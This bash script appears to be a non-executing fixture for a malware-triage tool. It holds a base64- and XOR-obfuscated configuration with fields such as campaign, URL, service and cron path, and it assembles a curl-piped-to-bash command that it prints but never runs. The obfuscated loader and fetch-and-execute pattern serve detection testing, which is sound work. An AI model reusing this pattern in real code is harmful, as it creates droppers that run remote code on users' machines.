#!/usr/bin/env bash
# Huntress Script Triage -- inert static-analysis fixture (bash_linux)
readonly Material_d95eb925='0O3coNOnwrLB/J3+j/qT4YTbqcyhzrrf85f+jf2c6IvjvMyl1bDMrcmo2KzJu4blk''OKO0aLWst2o3IPzmuqP84D0lfKXyKvEsd+rlqfbuNm0xKXMq8Wa85eqyajFtdS92r''SZqZChmKieq5n9mOSR44+y2q7aqtnjzOPT6tvi0uTR44fizKnRsN2twaSK4437mva''f+9TihLaG5Nbv3vCD65fikfSG2bjfutSgndWgzrrIrd6t4YDizf3E9cz8yv/Nqcw='
readonly Codec_d95eb925='base64_chunks|rolling_xor|a6'

Load_d95eb925() {
  stored_bytes=()
  local encoded_part
  while read -r encoded_part; do [[ -n "$encoded_part" ]] && stored_bytes+=("$encoded_part"); done < <(printf '%s' "${Material_d95eb925}" | base64 --decode | od -An -v -tu1 | tr -s ' ' '\n' | sed '/^$/d')
}

Decode_d95eb925() {
  recovered_bytes=()
  local prior_byte=166
  local byte_index
  for ((byte_index=0; byte_index<${#stored_bytes[@]}; byte_index++)); do
    recovered_bytes+=("$((stored_bytes[byte_index] ^ prior_byte))")
    prior_byte=${stored_bytes[byte_index]}
  done
}

Recover_d95eb925() {
  local -a stored_bytes recovered_bytes
  local configuration_text harmless_value decode_pass byte_index
  harmless_value=''
  Load_d95eb925
  Decode_d95eb925
  configuration_text=''
  local octal character
  for byte_index in "${!recovered_bytes[@]}"; do
    printf -v octal '%03o' "${recovered_bytes[byte_index]}"
    printf -v character '%b' "\\$octal"
    configuration_text+="$character"
  done
  printf '%s\n' "$configuration_text"
}

Inspect_d95eb925() { local recovered field; local -a fields; recovered="$(Recover_d95eb925)"; IFS='|' read -r -a fields <<< "$recovered"; (IFS='|'; printf '%s\n' "${fields[*]}"); }

Plan_d95eb925() {
  local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
  descriptor="$(Inspect_d95eb925)"
  local -a fields
  IFS='|' read -r -a fields <<< "$descriptor"
  for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
  local -a request_command=(curl --fail --silent --show-error "$url")
  local -a interpreter=(bash -s)
  declare -p request_command interpreter
}

if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_d95eb925; fi
